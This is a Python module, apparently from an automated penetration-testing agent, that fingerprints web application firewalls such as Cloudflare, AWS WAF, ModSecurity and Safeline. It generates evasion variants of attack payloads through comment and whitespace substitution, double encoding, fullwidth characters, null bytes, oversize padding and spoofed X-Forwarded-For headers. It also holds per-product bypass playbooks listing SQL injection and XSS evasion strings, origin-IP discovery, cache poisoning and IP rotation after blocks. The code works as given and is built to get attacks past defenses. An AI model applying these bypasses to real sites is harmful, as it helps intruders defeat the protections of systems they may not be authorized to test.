"""WAF 指纹与 payload 变形建议。

这是一个纯本地 advisor：不发网络请求，不自动绕过，只根据已有响应和当前
payload 给 worker 少量可验证的候选变形。真正验证仍必须走 http_request。
"""
from __future__ import annotations

from dataclasses import dataclass
import re
from typing import Any
from urllib.parse import quote


_MAX_PAYLOAD_LEN = 800
_MAX_BODY_LEN = 4000


@dataclass(frozen=True)
class WafSignature:
    name: str
    body_keywords: tuple[str, ...] = ()
    header_keys: tuple[str, ...] = ()
    header_values: dict[str, tuple[str, ...]] | None = None
    status_codes: tuple[int, ...] = (403, 406, 429, 501, 503)
    priorities: tuple[str, ...] = ("space", "encoding", "keyword", "header")


_SIGNATURES: tuple[WafSignature, ...] = (
    WafSignature(
        "cloudflare",
        body_keywords=("cloudflare", "cf-ray", "just a moment", "__cf_bm", "ray id"),
        header_keys=("cf-ray",),
        priorities=("encoding", "ua", "header", "space", "keyword"),
    ),
    WafSignature(
        "modsecurity",
        body_keywords=("mod_security", "modsecurity", "not acceptable", "406 not"),
        header_keys=("x-modsecurity",),
        priorities=("space", "keyword", "encoding", "header"),
    ),
    WafSignature(
        "nginx_openresty",
        body_keywords=("406 not acceptable", "openresty"),
        header_values={"server": ("nginx", "openresty")},
        status_codes=(403, 406),
        priorities=("space", "keyword", "encoding"),
    ),
    WafSignature(
        "aws_waf",
        body_keywords=("request blocked", "x-amzn-requestid", "aws"),
        header_keys=("x-amzn-requestid",),
        priorities=("encoding", "header", "space", "keyword"),
    ),
    WafSignature(
        "imperva",
        body_keywords=("imperva", "incapsula", "request denied by incapsula", "_imf", "incap_ses"),
        header_keys=("x-iinfo",),
        priorities=("ua", "header", "encoding", "space"),
    ),
    WafSignature(
        "f5_bigip",
        body_keywords=("the requested url was rejected", "f5"),
        header_keys=("x-cnection",),
        priorities=("space", "keyword", "encoding"),
    ),
    WafSignature(
        "safedog",
        body_keywords=("安全狗", "safedog", "safe3waf"),
        priorities=("encoding", "space", "keyword", "header"),
    ),
    WafSignature(
        "d_shield",
        body_keywords=("d盾", "d_shield", "iis防火墙"),
        priorities=("encoding", "keyword", "space", "header"),
    ),
    WafSignature(
        "akamai",
        # 只放强特征：'access denied' 太通用，会把 Sucuri/其他 WAF 抢过来。
        body_keywords=("akamai", "reference #", "akamaighost"),
        header_values={"server": ("akamaighost", "akamai")},
        priorities=("encoding", "json", "header", "space"),
    ),
    WafSignature(
        "sucuri",
        body_keywords=("sucuri", "cloudproxy", "sucuri website firewall"),
        header_keys=("x-sucuri-id", "x-sucuri-cache"),
        priorities=("encoding", "header", "space", "keyword"),
    ),
    WafSignature(
        "aliyun_waf",
        body_keywords=("aliyun", "yundun", "alicdn", "安全拦截", "aliyun_waf"),
        header_keys=("ali-cdn-request-id",),
        header_values={"server": ("tengine", "aliyun")},
        priorities=("encoding", "space", "keyword", "header"),
    ),
    WafSignature(
        "tencent_waf",
        body_keywords=("tencent", "waf拦截", "腾讯云", "stgw"),
        header_values={"server": ("stgw", "tencent")},
        priorities=("encoding", "space", "keyword", "header"),
    ),
    WafSignature(
        "safeline",
        body_keywords=("safeline", "雷池", "chaitin"),
        header_values={"server": ("safeline",)},
        priorities=("encoding", "space", "keyword", "header"),
    ),
    WafSignature(
        "generic",
        body_keywords=("access denied", "forbidden", "blocked", "firewall", "security violation", "拦截", "阻断", "攻击"),
        priorities=("space", "encoding", "keyword", "header"),
    ),
)


_BLOCK_STATUSES = {400, 403, 406, 429, 501, 503}
# 自动换出口只认这些状态。400 经常是业务参数错误，不拿来轮换 IP。
_PROXY_ROTATE_STATUSES = {403, 406, 429, 501, 503}
_NAMED_WAF = {
    "cloudflare", "modsecurity", "imperva", "f5_bigip", "safedog", "d_shield",
    "akamai", "sucuri", "aliyun_waf", "tencent_waf", "safeline",
}
# 只看响应正文里的强标记。不要用 _detect_waf 自产的「疑似拦截」文案，
# 也不要把普通 Forbidden / Server: nginx 当成封 IP。
_GENERIC_BODY_MARKERS = ("blocked", "firewall", "security violation", "拦截", "阻断")

# ---------------------------------------------------------------------------
# 产品级绕过技术清单（融合自 waf-bypass-techniques / WAF_PRODUCT_MATRIX.md）
# 只做「定向提示」，不自动发包；由 worker 拿具体 payload 逐条实测。
# 每条格式：(类别, 技术要点, 适用条件/注意)
# ---------------------------------------------------------------------------
_PRODUCT_PLAYBOOK: dict[str, tuple[dict[str, str], ...]] = {
    "cloudflare": (
        {"cat": "unicode", "tech": "全角/兼容 Unicode 字符替换（＜script＞）", "note": "Cloudflare 与后端归一化不一致时可能放行"},
        {"cat": "chunked", "tech": "Transfer-Encoding: chunked 把 payload 拆到多个 chunk", "note": "CF 可能不在重组后检查 body"},
        {"cat": "sqli", "tech": "/*!50000UniOn*/SeLeCt 版本注释绕过关键字匹配", "note": "MySQL 专用"},
        {"cat": "xss", "tech": "<svg/onload=alert&#40;1&#41;>、<details open ontoggle=alert(1)>", "note": "换事件与实体编码"},
        {"cat": "json", "tech": "form-urlencoded 转 JSON，走不同 parser 与更弱规则", "note": "需后端同时接受两种格式"},
        {"cat": "param", "tech": "参数名超过 128 字符可能让 CF 跳过检查", "note": "实测有效再采用"},
        {"cat": "path", "tech": "探测技术豁免路径（ACME/健康检查/监控端点）", "note": "ACME 路径的硬豁免是 2026-01 已修补的 0day，其他豁免路径仍可能存在"},
        {"cat": "origin", "tech": "DNS 历史 / Shodan ssl.cert.subject.cn / 邮件头找源站 IP", "note": "需在授权范围内，直连源站即完全绕开 CF"},
    ),
    "aws_waf": (
        {"cat": "size", "tech": "AWS WAF 只检查 body 前 8KB（CloudFront 16KB），之后的内容不检查", "note": "超长垫数据把 payload 推到边界之后"},
        {"cat": "regex", "tech": "构造复杂输入让 regex 规则执行超时 → 请求放行", "note": "无副作用，但结果不稳定"},
        {"cat": "json", "tech": "深度嵌套 JSON 超出解析深度限制", "note": "需后端也接受深层嵌套"},
        {"cat": "encoding", "tech": "参数值里的 Base64 不会被自动解码（除非配了 transform）", "note": "后端需自行 base64 解码"},
        {"cat": "scope", "tech": "规则可能只覆盖 URI 不管 body（或反之），分别测", "note": "先定位检查盲区再投递"},
        {"cat": "size", "tech": "SizeConstraintStatement 若配成「超限放行」，垫过 8KB 即可", "note": "需先探测该配置"},
    ),
    "modsecurity": (
        {"cat": "paranoia", "tech": "PL1（默认）规则极少，多数部署跑 PL1-2，缺大量攻击模式", "note": "先确认 PL 级别"},
        {"cat": "ruleid", "tech": "从报错取规则 ID（如 id:942100），针对该条 regex 定向构造", "note": "最省事的路径"},
        {"cat": "sqli", "tech": "/*! ... */ MySQL 条件注释绕过多数 CRS SQLi 规则", "note": "配合 CRS 版本判断"},
        {"cat": "encoding", "tech": "PL1 不检查 Unicode 编码 payload，%u0027 表示单引号", "note": "PL2+ 会检查"},
        {"cat": "multipart", "tech": "畸形 boundary 可扰乱 CRS 的 multipart 解析", "note": "CRS 4.x 已加强"},
        {"cat": "size", "tech": "SecRequestBodyNoFilesLimit 默认仅 128KB，上传字段内容若只受此限制则可越界", "note": "把 payload 塞进 file 字段"},
        {"cat": "anomaly", "tech": "异常评分模式：单条不触发、累计超阈值才拦，控制单条强度", "note": "分散触发点"},
    ),
    "akamai": (
        {"cat": "header", "tech": "X-Forwarded-Host 注入扰乱路由判断", "note": "Akamai 对特定头处理与后端不同"},
        {"cat": "encoding", "tech": "三重编码 / 混合编码（URL + Unicode + HTML）", "note": "逐层验证哪层被解码"},
        {"cat": "json", "tech": "深层嵌套 JSON 可能不被深度检查", "note": "同 AWS"},
        {"cat": "slowpost", "tech": "慢速 POST 让检查不完整", "note": "对生产环境风险高，慎用"},
        {"cat": "penalty", "tech": "触发后 IP 进 penalty box 被限速数分钟，每次测试换新出口", "note": "配合代理池轮换"},
        {"cat": "info", "tech": "Pragma: akamai-x-check-cacheable 可泄露内部路由信息", "note": "侦察辅助"},
    ),
    "imperva": (
        {"cat": "cookie", "tech": "需要有效 incap_ses / visid_incap cookie，先过 JS 挑战", "note": "无 cookie 会被直接拒"},
        {"cat": "encoding", "tech": "混合编码链（Identified by x-iinfo 头）", "note": "逐层试"},
        {"cat": "header", "tech": "X-Forwarded-For 伪造内网 IP 绕过 IP 白名单规则", "note": "需 WAF 信任该头"},
    ),
    "f5_bigip": (
        {"cat": "encoding", "tech": "ASM 对 URL 解码次数有限，双重编码常有效", "note": "主流突破口"},
        {"cat": "param", "tech": "参数污染，ASM 取第一个值而后端取最后一个", "note": "需确认后端取值方式"},
        {"cat": "json", "tech": "JSON body 可能不在检查范围（老版本 ASM）", "note": "老部署常见"},
    ),
    "sucuri": (
        {"cat": "origin", "tech": "Sucuri 是反向代理，找源站 IP 直连最有效", "note": "查 DNS 历史与证书"},
        {"cat": "encoding", "tech": "基础编码变形", "note": "Sucuri 规则相对简单"},
        {"cat": "cache", "tech": "先用干净请求毒化缓存，再让恶意请求命中缓存", "note": "需缓存可被影响"},
    ),
    "safedog": (
        {"cat": "encoding", "tech": "安全狗对 %u / 双重 URL 编码检查较弱", "note": "国内常见，优先编码"},
        {"cat": "space", "tech": "空格换 /*%%!*/ 或 %09 / %0a", "note": "配合关键字拆分"},
        {"cat": "keyword", "tech": "大小写混合 + 内联注释拆分关键字", "note": "逐字插入注释"},
        {"cat": "chunked", "tech": "分块传输拆分 payload", "note": "部分版本不重组"},
    ),
    "d_shield": (
        {"cat": "encoding", "tech": "D 盾对 Unicode 与 %u 编码检查弱", "note": "IIS/ASP 环境优先"},
        {"cat": "space", "tech": "空格替换为 %0a / %09 / /**/", "note": "经典手法"},
        {"cat": "keyword", "tech": "关键字内联注释拆分", "note": "配合大小写"},
    ),
    "safeline": (
        {"cat": "encoding", "tech": "雷池基于语义分析，纯编码绕过效果有限，优先换解析器", "note": "先试 contenttype/chunked，再试编码"},
        {"cat": "contenttype", "tech": "切换 Content-Type（JSON/multipart）走不同解析分支", "note": "语义引擎对非预期格式覆盖较弱"},
        {"cat": "chunked", "tech": "分块传输拆 payload", "note": "部分版本重组不完整"},
        {"cat": "solidus", "tech": "JSON \\/ 转义绕过签名匹配", "note": "2026 年研究，对语义引擎同样有效"},
        {"cat": "oversize", "tech": "超大 body 超出检查深度/长度上限", "note": "需确认后端不截断"},
    ),
    "aliyun_waf": (
        {"cat": "encoding", "tech": "阿里云盾对多重编码检查有限，优先双重 URL 编码", "note": "国内政企常见"},
        {"cat": "space", "tech": "空格替换 /**/ 或 %09", "note": "配合关键字拆分"},
        {"cat": "keyword", "tech": "大小写混合 + MySQL 版本注释 /*!50000xx*/", "note": "SQLi 首选"},
        {"cat": "contenttype", "tech": "改 JSON/multipart 走弱规则分支", "note": "需后端接受"},
        {"cat": "oversize", "tech": "body 超检查上限后不再扫描", "note": "常见 8KB 边界"},
    ),
    "tencent_waf": (
        {"cat": "encoding", "tech": "腾讯云 WAF 优先试双重编码与 Unicode", "note": "STGW 网关"},
        {"cat": "space", "tech": "空格替换为注释或制表符", "note": "基础手法"},
        {"cat": "keyword", "tech": "内联注释拆分关键字", "note": "配合大小写"},
        {"cat": "chunked", "tech": "分块传输绕过 body 检查", "note": "部分策略未重组"},
    ),
}

# 通用协议级技术（任何 WAF 都可能有效，来自 SKILL.md §2.2–2.8 / §3）
_PROTOCOL_PLAYBOOK: tuple[dict[str, str], ...] = (
    {"cat": "chunked", "tech": "Transfer-Encoding: chunked 拆分 payload，WAF 可能不重组", "note": "需后端接受 chunked"},
    {"cat": "hpp", "tech": "HTTP 参数污染：?a=1&a=<payload>，WAF 看第一个、后端取最后一个", "note": "PHP 取最后、Flask 取第一、ASP.NET 拼接"},
    {"cat": "contenttype", "tech": "切换 Content-Type（JSON / multipart / XML）走不同 parser", "note": "需后端接受该格式"},
    {"cat": "multipart", "tech": "multipart boundary 加长/特殊字符/缺结尾 boundary", "note": "部分 WAF 不检查全部 part"},
    {"cat": "oversize", "tech": "body 超 WAF 检查上限（常见 8KB-128KB）后不再检查", "note": "需确认后端不截断"},
    {"cat": "method", "tech": "换方法（POST→PUT/PATCH）或用 X-HTTP-Method-Override", "note": "不同方法可能走不同规则集"},
    {"cat": "absolute_uri", "tech": "请求行用绝对 URI：GET http://host/path?q=x HTTP/1.1", "note": "部分 WAF 取不到 path"},
    {"cat": "keepalive", "tech": "同一条 keep-alive 连接上第一发干净请求、再发攻击请求", "note": "部分 WAF 降低后续请求检查强度"},
    {"cat": "solidus", "tech": "JSON 里用 \\/ 转义（RFC 8259 合法），WAF 匹配原文、JSON.parse() 还原成 /", "note": "2026 年研究，对主流 WAF 有效"},
    {"cat": "pad_name", "tech": "超长参数名让 WAF 跳过该参数检查", "note": "需后端仍解析"},
)


def is_waf_blocked(
    status_code: int | None,
    response_headers: dict[str, Any] | None = None,
    response_body: str = "",
) -> bool:
    """有明确 WAF/封禁证据才返回 True。仅凭 403 或英文 Forbidden 不够。"""
    status = int(status_code or 0)
    if status not in _PROXY_ROTATE_STATUSES:
        return False
    headers = _normalize_headers(response_headers or {})
    body = response_body or ""
    signature, evidence = _detect_waf(status, headers, body)
    if signature.name in _NAMED_WAF:
        return True
    body_l = body.lower()
    if signature.name == "aws_waf":
        return "request blocked" in body_l
    if signature.name == "nginx_openresty":
        return "openresty" in body_l or "406 not acceptable" in body_l
    if signature.name != "generic":
        return False
    if "疑似" in (evidence or ""):
        return False
    return any(marker in body_l for marker in _GENERIC_BODY_MARKERS)


def suggest_waf_bypass(
    *,
    payload: str,
    status_code: int | None = None,
    response_headers: dict[str, Any] | None = None,
    response_body: str = "",
    context: str = "generic",
) -> dict[str, Any]:
    """返回 WAF 指纹和少量候选变形。

    context 只影响候选排序，不改变安全边界；支持 generic/sqli/xss/path/json/header。
    """
    raw_payload = (payload or "")[:_MAX_PAYLOAD_LEN]
    if not raw_payload:
        return {
            "ok": False,
            "kind": "arg_error",
            "error": "payload 不能为空",
            "guidance": "把被 WAF 拦截的最小 payload 或可控参数值传进来。",
        }

    normalized_headers = _normalize_headers(response_headers or {})
    body = (response_body or "")[:_MAX_BODY_LEN]
    status = int(status_code or 0)
    signature, evidence = _detect_waf(status, normalized_headers, body)
    priorities = _priorities_for_context(signature.priorities, context)

    variants = _generate_payload_variants(raw_payload, priorities, context)
    header_variants = _header_variants(priorities)

    # 产品级定向技术清单：识别到具名 WAF 时给该产品的招法，否则给通用协议级招法。
    playbook = list(_PRODUCT_PLAYBOOK.get(signature.name) or _PROTOCOL_PLAYBOOK)

    return {
        "ok": True,
        "detected": signature.name != "none",
        "waf_type": signature.name,
        "evidence": evidence,
        "blocked_likely": status in _BLOCK_STATUSES or signature.name != "none",
        "strategy_priority": list(priorities),
        "payload_variants": variants[:12],
        "header_variants": header_variants[:6],
        "product_playbook": playbook,
        "guidance": (
            "这是纯本地建议，不代表已绕过。只挑 1-3 个最贴近当前验证链的变形，"
            "用 http_request 复测 baseline vs variant；只有响应差异能证明真实危害时才提交。"
            "product_playbook 是产品定向招法，按 cat 与当前漏洞类匹配后再试；"
            "一次只改一种变形，成功条件是「边缘放行 且 后端解析出危险语义」，不是 200。"
        ),
    }


def _normalize_headers(headers: dict[str, Any]) -> dict[str, str]:
    return {str(k).lower(): str(v).lower() for k, v in headers.items()}


def _detect_waf(status: int, headers: dict[str, str], body: str) -> tuple[WafSignature, str]:
    body_lower = body.lower()
    for sig in _SIGNATURES:
        for key in sig.header_keys:
            if key.lower() in headers:
                return sig, f"命中响应头 `{key}`"
        for header, values in (sig.header_values or {}).items():
            hv = headers.get(header.lower(), "")
            if hv and any(v.lower() in hv for v in values):
                if status in sig.status_codes or any(k in body_lower for k in sig.body_keywords):
                    return sig, f"响应头 `{header}: {hv[:80]}` + HTTP {status}"
        for keyword in sig.body_keywords:
            if keyword.lower() in body_lower:
                return sig, f"命中响应体关键词 `{keyword}`"
        if sig.name != "generic" and status in sig.status_codes and body:
            # 非 generic 仅靠状态码不够，避免把普通 403 误判成某具体 WAF。
            continue
    if status in _BLOCK_STATUSES:
        generic = next(s for s in _SIGNATURES if s.name == "generic")
        return generic, f"HTTP {status} 疑似拦截"
    return WafSignature("none", priorities=("space", "encoding", "keyword")), "未见明确 WAF 指纹"


def _priorities_for_context(base: tuple[str, ...], context: str) -> tuple[str, ...]:
    ctx = (context or "generic").lower()
    preferred: tuple[str, ...]
    if ctx in ("sqli", "sql", "sql_injection"):
        preferred = ("space", "keyword", "encoding", "operator", "solidus", "header")
    elif ctx in ("xss", "html"):
        preferred = ("encoding", "case", "html", "fullwidth", "header")
    elif ctx in ("path", "lfi", "download"):
        preferred = ("path", "encoding", "nullbyte", "header")
    elif ctx in ("json", "api"):
        preferred = ("json", "solidus", "encoding", "header", "space")
    elif ctx in ("rce", "cmd", "ssti"):
        preferred = ("space", "encoding", "keyword", "header")
    else:
        preferred = base
    merged: list[str] = []
    for item in preferred + base:
        if item not in merged:
            merged.append(item)
    return tuple(merged)


def _generate_payload_variants(payload: str, priorities: tuple[str, ...], context: str) -> list[dict[str, str]]:
    variants: list[dict[str, str]] = []
    seen = {payload}

    def add(strategy: str, technique: str, value: str) -> None:
        if not value or value in seen:
            return
        seen.add(value)
        variants.append({"strategy": strategy, "technique": technique, "payload": value})

    for strategy in priorities:
        if strategy == "space":
            add(strategy, "space_to_comment", payload.replace(" ", "/**/"))
            add(strategy, "space_to_tab", payload.replace(" ", "%09"))
            add(strategy, "space_to_newline", payload.replace(" ", "%0a"))
        elif strategy in ("keyword", "case"):
            add(strategy, "mixed_case", _mixed_case_keywords(payload))
            add(strategy, "keyword_inline_comment", _keyword_inline_comment(payload))
            add(strategy, "union_newline", re.sub(r"\bUNION\s+SELECT\b", "UNION%0aSELECT", payload, flags=re.I))
        elif strategy == "operator":
            add(strategy, "logical_operator", re.sub(r"\bAND\b", "&&", re.sub(r"\bOR\b", "||", payload, flags=re.I), flags=re.I))
            add(strategy, "comparison_noise", re.sub(r"\b1\s*=\s*1\b", "GREATEST(1,1)=1", payload, flags=re.I))
        elif strategy == "encoding":
            add(strategy, "url_encode", quote(payload, safe=""))
            add(strategy, "double_url_encode", quote(quote(payload, safe=""), safe=""))
            add(strategy, "quote_unicode_escape", payload.replace("'", "%u0027").replace('"', "%u0022"))
        elif strategy == "html":
            add(strategy, "html_entity_angles", payload.replace("<", "&lt;").replace(">", "&gt;"))
            add(strategy, "slash_entity", payload.replace("/", "&#x2f;"))
        elif strategy == "path":
            add(strategy, "dot_slash", payload.replace("/", "/./"))
            add(strategy, "double_slash", payload.replace("/", "//"))
            add(strategy, "encoded_slash", payload.replace("/", "%2f"))
        elif strategy == "json":
            add(strategy, "json_string_escape", payload.replace("\\", "\\\\").replace('"', '\\"'))
        elif strategy == "fullwidth":
            # 全角/兼容字符：Cloudflare 与后端归一化不一致时可能放行
            fw = payload.translate(str.maketrans({"<": "\uff1c", ">": "\uff1e", "/": "\uff0f", "'": "\uff07", '"': "\uff02"}))
            add(strategy, "fullwidth_chars", fw)
            add(strategy, "compat_lt_gt", payload.replace("<", "\uff1c").replace(">", "\uff1e"))
        elif strategy == "solidus":
            # RFC 8259 合法的 \/ 转义，JSON.parse 还原成 /，签名规则常漏
            add(strategy, "json_solidus", payload.replace("/", "\\/"))
        elif strategy == "nullbyte":
            # 老解析器在 %00 处截断，WAF 看到的是截断后内容
            add(strategy, "null_split", re.sub(r"(?i)(select|union|script|from|where)", r"\1%00", payload))
        elif strategy == "chunk":
            # 只给提示：真正分包需要在 http_request 里发 chunked，这里仅标注
            add(strategy, "chunk_hint", payload)
            variants[-1]["technique"] = "chunk_hint(需用 chunked 发送，见 product_playbook)"
        elif strategy == "oversize":
            # 垫数据把 payload 推过 WAF 检查边界（WAF 通常看前 8KB）
            pad = "a" * 8192
            add(strategy, "oversize_pad_prefix", pad + "&" + payload)
            add(strategy, "oversize_pad_suffix", payload + "&" + pad)
        elif strategy == "paramname":
            # 超长参数名让部分 WAF 跳过该参数
            longname = "z" * 200
            add(strategy, "long_param_name", longname + "=" + payload)

    return variants


_SQL_KEYWORDS = re.compile(r"\b(select|union|and|or|from|where|order|sleep|benchmark|if)\b", re.I)


def _mixed_case_keywords(payload: str) -> str:
    def repl(match: re.Match[str]) -> str:
        word = match.group(0)
        return "".join(ch.upper() if i % 2 == 0 else ch.lower() for i, ch in enumerate(word))

    return _SQL_KEYWORDS.sub(repl, payload)


def _keyword_inline_comment(payload: str) -> str:
    return _SQL_KEYWORDS.sub(lambda m: f"/*!{m.group(0)}*/", payload)


def _header_variants(priorities: tuple[str, ...]) -> list[dict[str, str]]:
    if "header" not in priorities and "ua" not in priorities:
        return []
    variants = [
        {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120 Safari/537.36"},
        {"X-Forwarded-For": "127.0.0.1"},
        {"X-Real-IP": "127.0.0.1"},
        {"X-Originating-IP": "127.0.0.1"},
        {"X-Forwarded-Proto": "https"},
        {"X-Requested-With": "XMLHttpRequest"},
    ]
    return variants

